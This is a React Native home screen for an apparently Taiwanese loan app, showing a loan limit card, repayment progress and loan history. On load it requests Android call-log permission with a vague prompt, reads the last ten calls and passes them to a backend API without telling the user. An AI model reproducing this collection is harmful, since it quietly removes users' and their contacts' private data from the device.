import React, { useEffect, useState } from "react";
import {
  Alert,
  Image,
  ImageBackground,
   ScrollView,
  Text,
  TouchableOpacity,
  View,
  StyleSheet,
  Linking,
  PermissionsAndroid,
  Platform,
 } from "react-native";
import { useNavigation, useRoute, NavigationProp } from "@react-navigation/native";
import { SafeAreaView } from "react-native-safe-area-context";
import strings from "../../Languages";
import LoadingModal from "../../components/LoadingModal";
import CallLogs from 'react-native-call-log';
import { errorToast } from "../api/customToast";
import { CalllogApi } from "../api/apiRequest";
import StatusBarComponent from "../../components/StatusBarComponent";
import AsyncStorage from "@react-native-async-storage/async-storage";
import DeviceInfoScreen from "../../components/DeviceInfo";

const Navbar = require('../../components/Navbar').default;
const HamburgerMenu = require('../../components/HamburgerMenu').default;

export default function HomeScreen() {
  const navigation = useNavigation<NavigationProp<any>>();
  const route = useRoute();
  const [showHamburgerMenu, setShowHamburgerMenu] = useState(false);

  const handleCallPress = async (number) => {
    const url = `tel:${number}`; // iOS/Android dono ke liye kaam karta hai
    try {
      const supported = await Linking.canOpenURL(url);
      if (!supported) {
       navigation.navigate("CallLogsScreen")
        return;
      }
      await Linking.openURL(url);
    } catch (err) {
      console.error('Failed to open dialer', err);
      Alert.alert('Error', 'Could not open phone dialer');
    }
  };
const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    getCallLogs();
  }, []);

  const getCallLogs = async () => {
    if (Platform.OS !== 'android') {
      alert('📱 Call logs not available on iOS');
      return;
    }
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Permission',
          message: 'App needs access to your call logs',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        const result = await CallLogs.load(10);  
         calllogFuncation(result)
        setLogs(result);
      } else {
        alert('Permission denied');
      }
    } catch (e) {
      console.log('Error fetching logs', e);
    } finally {
      setLoading(false);
    }
  };

  const calllogFuncation = async (log:any) => {
   try {
     setLoading(true);
     const response = await CalllogApi(log, setLoading);
  } catch (error) {
     errorToast('Something went wrong. Please try again.');
  } finally {
     setLoading(false);
  }
};


  return (
    <SafeAreaView style={styles.container}>
      <StatusBarComponent/>
                          <LoadingModal visible={loading}/>
  <DeviceInfoScreen/>  
      <ScrollView style={styles.scroll} 
	  showsVerticalScrollIndicator={false}
	  >
                          {/* <LoadingModal visible={true}/> */}

        {/* Top Header */}
        <View style={styles.header}>
          {/* Hamburger Menu */}
          <TouchableOpacity
            style={styles.iconButton}
            onPress={() => setShowHamburgerMenu(true)}
          >
            <Image
              source={require('../../assets/images/icons/menu.png')}
              style={styles.iconSmall}
            />
          </TouchableOpacity>

          {/* Title */}
          <Text style={styles.headerTitle}>{strings.home}</Text>

          {/* Right Action Buttons */}
          <View style={styles.headerRight}>
            <TouchableOpacity
              style={[styles.iconButton, { marginRight: 12 }]}
             onPress={() => handleCallPress("904834")}
            >
              <Image
                source={require('../../assets/images/icons/call.png')}
                style={styles.iconSmall}
              />
            </TouchableOpacity>
            <TouchableOpacity
              style={styles.iconButton}
              onPress={() => navigation.navigate('NotificationsScreen')}
            >
              <Image
                source={require('../../assets/images/icons/notification.png')}
                style={styles.iconSmall}
              />
            </TouchableOpacity>
          </View>
        </View>

        {/* Loan Card */}
        <View style={styles.loanCard}>
          <View style={styles.loanCardImageContainer}>
            <Image
              source={require('../../assets/images/home/loan-card.png')}
              style={styles.loanCardImage}
            />
          </View>
          <View style={styles.greeting}>
            <Image
              source={require('../../assets/images/home/greeting-avatar.png')}
              style={styles.avatar}
            />
            <Text style={styles.greetingText}>Hi Steve!</Text>
          </View>
          <Text style={styles.loanText}>您的可貸額度為</Text>
          <Text style={styles.loanAmount}>NT $ 10,000</Text>

          {/* Progress Bar */}
          <View style={styles.progressBg}>
            <View style={[styles.progressFill, { width: '75%' }]} />
          </View>

          <View style={styles.borrowMoreContainer}>
            <TouchableOpacity
              style={styles.borrowMoreButton}
              onPress={() => navigation.navigate('ApplyLoanScreen')}
              // onPress={() => navigation.navigate('ApplyLoan')}
            >
              <Text style={styles.borrowMoreText}>{strings.home} Want To Borrow More?</Text>
              {/* <Text style={styles.borrowMoreText}>想要借更多嗎?</Text> */}
            </TouchableOpacity>
          </View>
        </View>

        {/* Amount Repaid */}
        <View style={styles.repaidContainer}>
          <View style={styles.repaidLeft}>
            <Image
              source={require('../../assets/images/home/amount-repaid.png')}
              style={styles.repaidIcon}
            />
            <View style={styles.repaidTextContainer}>
              <Text style={styles.repaidTitle}>{strings?.RepaidAmount}</Text>
              {/* <Text style={styles.repaidTitle}>已還款金額</Text> */}
              <Text style={styles.repaidSubtitle}>{strings?.LoremIpsum}</Text>
            </View>
          </View>
          <ImageBackground
            source={require('../../assets/images/home/progress-bg.png')}
            style={styles.repaidRight}
            resizeMode="stretch"
          >
            <Text style={styles.repaidPercentage}>75%</Text>
          </ImageBackground>
        </View>

        {/* Loan History */}
        <View style={styles.loanHistoryContainer}>
          <View style={styles.loanHistoryHeader}>
            <Text style={styles.loanHistoryTitle}>{strings?.LoanHistory}</Text>
            {/* <Text style={styles.loanHistoryTitle}>貸款歷史</Text> */}
            <Image
              source={require('../../assets/images/home/history.png')}
              style={styles.loanHistoryIcon}
            />
          </View>
{/* 
           {[
            { img: 'loan-received', title: '貸款已入帳', desc: 'Loan of N30,000 was received' },
            { img: 'loan-disbursed', title: '貸款已撥款', desc: 'N30,000 was disbursed to your bank' },
            { img: 'loan-approved', title: '貸款已核准', desc: 'N30,000 was approved' },
            { img: 'loan-received', title: '貸款已入帳', desc: 'Loan of N30,000 was received' },
            { img: 'loan-declined', title: '貸款已拒絕', desc: 'We’re sorry! your loan was declined' },
          ].map((item, index) => ( */}

           {[
            
          ].map((item, index) => (
            <View key={index} style={styles.historyItem}>
              <View style={styles.historyItemLeft}>
                <Image
              source={require('../../assets/images/home/loan-approved.png')}
                  style={styles.historyItemIcon}
                />
                <View style={styles.historyItemText}>
                  <Text style={styles.historyItemTitle}>{item.title}</Text>
                  <Text style={styles.historyItemDesc}>{item.desc}</Text>
                </View>
              </View>
              <Image
                source={require('../../assets/images/home/arrow-right.png')}
                style={styles.historyItemArrow}
              />
            </View>
          ))}
        </View>
      </ScrollView>

      {/* Bottom Navigation */}
      {/* <Navbar 	={handleLogout} /> */}

      {/* Hamburger Menu */}
      <HamburgerMenu
        visible={showHamburgerMenu}
        onClose={() => setShowHamburgerMenu(false)}
      />
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: 'white' },
  scroll: { flex: 1 },
  header: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', marginHorizontal: 24, marginTop: 16, marginBottom: 24, paddingVertical: 8 },
  iconButton: { borderWidth: 1, borderColor: '#FACC15', borderRadius: 12, padding: 8 },
  iconSmall: { width: 24, height: 24 },
  headerTitle: { fontSize: 24, fontWeight: 'bold', color: '#374151' },
  headerRight: { flexDirection: 'row' },

  loanCard: { backgroundColor: '#374061', borderRadius: 12, marginHorizontal: 24, padding: 16, minHeight: 180, marginBottom: 24, position: 'relative' },
  loanCardImageContainer: { position: 'absolute', top: 8, right: 8, width: 64, height: 64 },
  loanCardImage: { width: '100%', height: '100%', borderRadius: 12 },
  greeting: { flexDirection: 'row', alignItems: 'center', marginBottom: 8 },
  avatar: { width: 24, height: 24, marginRight: 8 },
  greetingText: { fontSize: 16, fontWeight: 'bold', color: 'white' },
  loanText: { fontSize: 16, fontWeight: 'bold', color: 'white', marginBottom: 4 },
  loanAmount: { fontSize: 28, fontWeight: 'bold', color: '#FACC15', marginBottom: 8 },
  progressBg: { height: 8, borderRadius: 4, backgroundColor: '#D1D5DB', marginBottom: 8 },
  progressFill: { height: 8, borderRadius: 4, backgroundColor: '#FACC15' },
  borrowMoreContainer: { flexDirection: 'row', justifyContent: 'flex-end' ,marginTop:11 },
  borrowMoreButton: { backgroundColor: '#FACC15', borderRadius: 8, paddingVertical: 6, paddingHorizontal: 16 },
  borrowMoreText: { color: '#1F2937', fontWeight: 'bold', fontSize: 14 },

  repaidContainer: { flexDirection: 'row', alignItems: 'center', borderWidth: 1, borderColor: '#93C5FD', borderRadius: 12, backgroundColor: '#EFF6FF', marginHorizontal: 24, padding: 8, marginBottom: 24 },
  repaidLeft: { flexDirection: 'row', flex: 1, alignItems: 'center', marginRight: 12 },
  repaidIcon: { width: 48, height: 48, marginRight: 8 },
  repaidTextContainer: { flex: 1 },
  repaidTitle: { fontSize: 18, fontWeight: 'bold', color: '#1E293B', marginBottom: 2 },
  repaidSubtitle: { fontSize: 12, color: '#6B7280' },
  repaidRight: { paddingVertical: 20, paddingHorizontal: 16, justifyContent: 'center', alignItems: 'center' },
  repaidPercentage: { fontSize: 16, fontWeight: 'bold', color: '#1E293B' },

  loanHistoryContainer: { marginHorizontal: 24, marginBottom: 24 },
  loanHistoryHeader: {  flexDirection: 'row', alignItems: 'center', marginBottom: 18 },
  loanHistoryTitle: { flex: 1, fontSize: 24, fontWeight: 'bold', color: '#1E293B' },
  loanHistoryIcon: { width: 24, height: 24 },

  historyItem: { flexDirection: 'row', alignItems: 'center', marginBottom: 14 },
  historyItemLeft: { flex: 1, flexDirection: 'row', alignItems: 'center', marginRight: 12 },
  historyItemIcon: { width: 45, height: 45, marginRight: 10 },
  historyItemText: { flex: 1 },
  historyItemTitle: { fontSize: 14, fontWeight: '500', color: '#383D50', marginBottom: 2 },
  historyItemDesc: { fontSize: 12, color: '#888888' },
  historyItemArrow: { width: 18, height: 18 },
});